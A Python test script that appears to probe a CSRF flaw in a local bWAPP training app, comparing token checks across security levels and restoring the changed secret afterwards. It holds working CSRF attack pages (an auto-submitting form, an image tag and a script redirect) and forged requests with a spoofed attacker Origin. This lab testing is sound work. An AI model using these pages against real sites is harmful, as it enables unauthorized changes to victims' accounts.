#!/usr/bin/env python3
# loop3 t4 probe8: B3 CSRF —— 有 token vs 无 token 对照 + 真实可回滚变更
# 目标关卡：/bWAPP/csrf_3.php（同一个「改 secret」动作，靠 security_level cookie 决定是否校验 token）
# 顺序严格是：先只读对照 → 再真实变更 → 立即复原 → 直查库确认
import json, re, subprocess, datetime, time, os
import requests

BASE = "http://127.0.0.1"
GAP = 1.2
UA = "loop3-t4/1.0 (authorized local lab)"
FACTORY = "Any bugs?"
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": [], "raw": []}


def rec(name, **kw):
    OUT["steps"].append({"step": name, **kw})
    print(f"--- {name}: " + json.dumps(kw, ensure_ascii=False)[:1000], flush=True)
    return kw


def db(sql):
    r = subprocess.run(["sudo", "-n", "mariadb", "-N", "-e", sql], capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


def secret_of(login="bee"):
    return db(f"SELECT secret FROM bWAPP.users WHERE login='{login}';")


def login(level="0"):
    s = requests.Session()
    s.headers["User-Agent"] = UA
    r = s.post(BASE + "/bWAPP/login.php",
               data={"login": "bee", "password": "bug", "security_level": level, "form": "submit"},
               allow_redirects=False, timeout=20)
    return s, r


rec("secret_before_any_test", value=secret_of())

# ============ 步骤1：只读对照 —— medium(security_level=1) 无 token ============
s_m, r = login("1")
time.sleep(GAP)
url = BASE + "/bWAPP/csrf_3.php"
params = {"action": "change", "secret": "csrf-poc-medium-should-NOT-write", "login": "bee"}
hdr = {"Origin": "http://attacker.loop3.invalid", "Referer": "http://attacker.loop3.invalid/evil.html"}
r = s_m.post(url, data=params, headers=hdr, timeout=20)
rec("S1_control_medium_no_token",
    http="POST /bWAPP/csrf_3.php", security_level=s_m.cookies.get("security_level"),
    origin_sent=hdr["Origin"], status=r.status_code,
    resp_snippet=re.sub(r"\s+", " ", r.text[:200]), invalid_token=("Invalid token" in r.text))
OUT["raw"].append({"step": "S1", "request": {"method": "POST", "url": url, "params": params, "headers_sent": hdr},
                   "response": {"status": r.status_code, "body": r.text[:800]}})
time.sleep(GAP)
rec("S1_db_after", value=secret_of(), unchanged=(secret_of() == FACTORY))

# ============ 步骤2：真实变更 —— low(security_level=0) 无 token，跨站形态 ============
MARK = "csrf-poc-" + datetime.datetime.now().strftime("%H%M%S")
s_l, r = login("0")
time.sleep(GAP)
params2 = {"action": "change", "secret": MARK, "login": "bee"}
r = s_l.post(url, data=params2, headers=hdr, timeout=20)
rec("S2_crosssite_low_no_token",
    http="POST /bWAPP/csrf_3.php", security_level=s_l.cookies.get("security_level"),
    origin_sent=hdr["Origin"], status=r.status_code,
    resp_snippet=re.sub(r"\s+", " ", r.text[:200]), changed=("changed" in r.text))
OUT["raw"].append({"step": "S2", "request": {"method": "POST", "url": url, "params": params2, "headers_sent": hdr},
                   "response": {"status": r.status_code, "body": r.text[:800]}})
time.sleep(GAP)
rec("S2_db_after_write", value=secret_of(), mark=MARK, matches=(secret_of() == MARK))

# ============ 步骤3：复原 ============
time.sleep(GAP)
r = s_l.post(url, data={"action": "change", "secret": FACTORY, "login": "bee"}, timeout=20)
time.sleep(GAP)
rec("S3_restore", resp_snippet=re.sub(r"\s+", " ", r.text[:200]), value=secret_of(),
    restored=(secret_of() == FACTORY))

# ============ 步骤4：真实浏览器跨站测试（opaque origin: file://） ============
evil_post = """<!doctype html><html><body>
<form id="f" method="POST" action="http://127.0.0.1/bWAPP/csrf_3.php">
<input name="action" value="change"><input name="secret" value="csrf-poc-BROWSERPOST"><input name="login" value="bee">
</form><script>document.getElementById('f').submit();</script></body></html>
"""
evil_get = """<!doctype html><html><body>
<img src="http://127.0.0.1/bWAPP/csrf_3.php?action=change&secret=csrf-poc-BROWSERIMG&login=bee" width="1" height="1">
</body></html>
"""
evil_nav = """<!doctype html><html><body>
<script>location.href="http://127.0.0.1/bWAPP/csrf_3.php?action=change&secret=csrf-poc-BROWSERNAV&login=bee";</script>
</body></html>
"""
for n, c in (("/tmp/loop3-b3-evil-post.html", evil_post),
             ("/tmp/loop3-b3-evil-img.html", evil_get),
             ("/tmp/loop3-b3-evil-nav.html", evil_nav)):
    open(n, "w").write(c)
rec("evil_pages_written", files=["/tmp/loop3-b3-evil-post.html", "/tmp/loop3-b3-evil-img.html", "/tmp/loop3-b3-evil-nav.html"],
    origin="file:// (opaque, 非 http(s) → 跨站)")

br = {"ok": False}
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.common.by import By

    opts = Options()
    opts.binary_location = "/usr/bin/chromium"
    for a in ("--headless=new", "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
              "--window-size=1280,900"):
        opts.add_argument(a)
    d = webdriver.Chrome(service=ChromeService(executable_path="/usr/bin/chromedriver"), options=opts)
    br["ok"] = True

    # 受害者登录 bWAPP（low）
    d.get(BASE + "/bWAPP/login.php")
    d.add_cookie({"name": "security_level", "value": "0", "domain": "127.0.0.1", "path": "/"})
    d.get(BASE + "/bWAPP/login.php")
    d.find_element(By.NAME, "login").send_keys("bee")
    d.find_element(By.NAME, "password").send_keys("bug")
    d.find_element(By.NAME, "form").click()
    time.sleep(GAP)
    rec("S4_victim_logged_in", url=d.current_url, title=d.title,
        cookie=d.execute_script("return document.cookie"))

    for label, page, marker in (("BROWSERPOST", "/tmp/loop3-b3-evil-post.html", "csrf-poc-BROWSERPOST"),
                                ("BROWSERIMG", "/tmp/loop3-b3-evil-img.html", "csrf-poc-BROWSERIMG"),
                                ("BROWSERNAV", "/tmp/loop3-b3-evil-nav.html", "csrf-poc-BROWSERNAV")):
        before = secret_of()
        d.get("file://" + page)
        time.sleep(2.5)
        after = secret_of()
        rec(f"S4_{label}_result", marker=marker, db_before=before, db_after=after,
            csrf_succeeded=(after == marker), landed_url=d.current_url[:160])
        if after != FACTORY:
            # 立即复原
            d.get(BASE + "/bWAPP/csrf_3.php?action=change&secret=" + requests.utils.quote(FACTORY) + "&login=bee")
            time.sleep(GAP)
            rec(f"S4_{label}_restore", value=secret_of(), restored=(secret_of() == FACTORY))
    try:
        d.quit()
    except Exception:
        pass
except Exception as e:
    br["error"] = repr(e)[:500]
    rec("S4_browser_error", error=repr(e)[:500])
rec("S4_driver", **br)

# ============ 步骤5：Cookie 属性（配置层根因） ============
atts = {}
for p in ("/bWAPP/login.php", "/bWAPP/csrf_3.php"):
    rr = requests.get(BASE + p, timeout=20)
    atts[p] = rr.headers.get("Set-Cookie", "")
r = requests.get(BASE + "/bWAPP/portal.php", timeout=20)
atts["/bWAPP/portal.php"] = r.headers.get("Set-Cookie", "")
rec("S5_set_cookie_bwapp", **atts)
REC = requests.Session()
REC.headers["User-Agent"] = UA
REC.cookies.set("PHPSESSID", "loop3t4recordingid0000000000001", domain="127.0.0.1", path="/")
r = REC.get(BASE + "/bWAPP/csrf_3.php", timeout=20)
rec("S5_no_samesite_no_httponly_confirmed",
    set_cookie=r.headers.get("Set-Cookie", ""),
    samesite_present=("SameSite" in r.headers.get("Set-Cookie", "")),
    httponly_present=("HttpOnly" in r.headers.get("Set-Cookie", "")))

rec("secret_final", value=secret_of(), is_factory=(secret_of() == FACTORY))

with open("/tmp/loop3-t4-probe8.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok", "secret": secret_of()}))
